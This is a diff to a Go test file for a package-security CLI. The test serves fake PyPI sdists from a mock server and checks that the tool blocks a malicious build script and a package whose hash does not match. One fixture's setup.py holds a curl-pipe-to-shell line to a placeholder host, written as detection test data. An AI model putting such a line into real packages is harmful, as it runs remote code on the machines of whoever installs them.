@@ -1,6 +1,11 @@
 package cli
 
 import (
+	"archive/tar"
+	"bytes"
+	"compress/gzip"
+	"crypto/sha256"
+	"encoding/hex"
 	"encoding/json"
 	"net/http"
 	"net/http/httptest"
@@ -102,5 +107,102 @@ dependencies = [{ name = "oldpkg" }, { name = "freshpkg" }, { name = "reqeusts" 
 		if got[id] != rules {
 			t.Errorf("%s: findings %q, want %q (all: %v)", id, got[id], rules, got)
 		}
+	}
+}
+
+func targz(t *testing.T, files map[string]string) []byte {
+	t.Helper()
+	var buf bytes.Buffer
+	gz := gzip.NewWriter(&buf)
+	tw := tar.NewWriter(gz)
+	for name, body := range files {
+		_ = tw.WriteHeader(&tar.Header{Name: name, Mode: 0o644, Size: int64(len(body)), Typeflag: tar.TypeReg})
+		_, _ = tw.Write([]byte(body))
+	}
+	_ = tw.Close()
+	_ = gz.Close()
+	return buf.Bytes()
+}
+
+// check --deep downloads each sdist, verifies it, and scans its build code.
+func TestCheckDeepPython(t *testing.T) {
+	evil := targz(t, map[string]string{"evil-1.0/setup.py": "import subprocess\nsubprocess.run('curl -s https://x.example/p | sh', shell=True)\n"})
+	honest := targz(t, map[string]string{"honest-1.0/setup.py": "from setuptools import setup\nsetup()\n"})
+	sum := func(b []byte) string { s := sha256.Sum256(b); return hex.EncodeToString(s[:]) }
+	var srvURL string
+	doc := func(name string, served []byte, listedSHA string) string {
+		b, _ := json.Marshal(map[string]any{
+			"info": map[string]string{"name": name},
+			"releases": map[string]any{"1.0": []map[string]any{{
+				"filename": name + "-1.0.tar.gz", "url": srvURL + "/files/" + name + "-1.0.tar.gz",
+				"digests": map[string]string{"sha256": listedSHA}, "packagetype": "sdist",
+				"upload_time_iso_8601": "2024-01-01T00:00:00Z",
+			}}},
+		})
+		_ = served
+		return string(b)
+	}
+	files := map[string][]byte{"/files/evil-1.0.tar.gz": evil, "/files/honest-1.0.tar.gz": honest, "/files/swapped-1.0.tar.gz": honest}
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		switch r.URL.Path {
+		case "/pypi/evil/json":
+			_, _ = w.Write([]byte(doc("evil", evil, sum(evil))))
+		case "/pypi/honest/json":
+			_, _ = w.Write([]byte(doc("honest", honest, sum(honest))))
+		case "/pypi/swapped/json":
+			_, _ = w.Write([]byte(doc("swapped", honest, sum([]byte("what PyPI says it is")))))
+		default:
+			if b, ok := files[r.URL.Path]; ok {
+				_, _ = w.Write(b)
+				return
+			}
+			http.NotFound(w, r)
+		}
+	}))
+	defer srv.Close()
+	srvURL = srv.URL
+	t.Setenv("SAFE_INSTALL_PYPI_URL", srv.URL)
+	t.Setenv("SAFE_INSTALL_OSV_URL", "off")
+	t.Setenv("SAFE_INSTALL_CACHE_DIR", t.TempDir())
+	dir := t.TempDir()
+	t.Chdir(dir)
+	if err := os.WriteFile(filepath.Join(dir, "requirements.txt"), []byte("evil==1.0\nhonest==1.0\nswapped==1.0\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	out, err := runCLIOut(t, "check", "--deep", "--format", "json", "--fail-on", "none")
+	if err != nil {
+		t.Fatalf("%v\n%s", err, out)
+	}
+	var rep struct {
+		Warnings []string `json:"warnings"`
+		Packages []struct {
+			ID       string `json:"id"`
+			Level    string `json:"level"`
+			Findings []struct{ Rule string }
+		} `json:"packages"`
+	}
+	if err := json.Unmarshal([]byte(out), &rep); err != nil {
+		t.Fatalf("%v\n%s", err, out)
+	}
+	got := map[string]string{}
+	for _, p := range rep.Packages {
+		var r []string
+		for _, f := range p.Findings {
+			r = append(r, f.Rule)
+		}
+		got[p.ID] = p.Level + " " + strings.Join(r, ",")
+	}
+	want := map[string]string{
+		"evil@1.0":    "block SI-BLD-001,SI-BLD-002,SI-CODE-001",
+		"honest@1.0":  "medium SI-BLD-001",
+		"swapped@1.0": "block SI-BLD-001,SI-INT-001",
+	}
+	for id, w := range want {
+		if got[id] != w {
+			t.Errorf("%s: %q, want %q", id, got[id], w)
+		}
+	}
+	if len(rep.Warnings) != 0 {
+		t.Errorf("warnings: %v", rep.Warnings)
 	}
 }
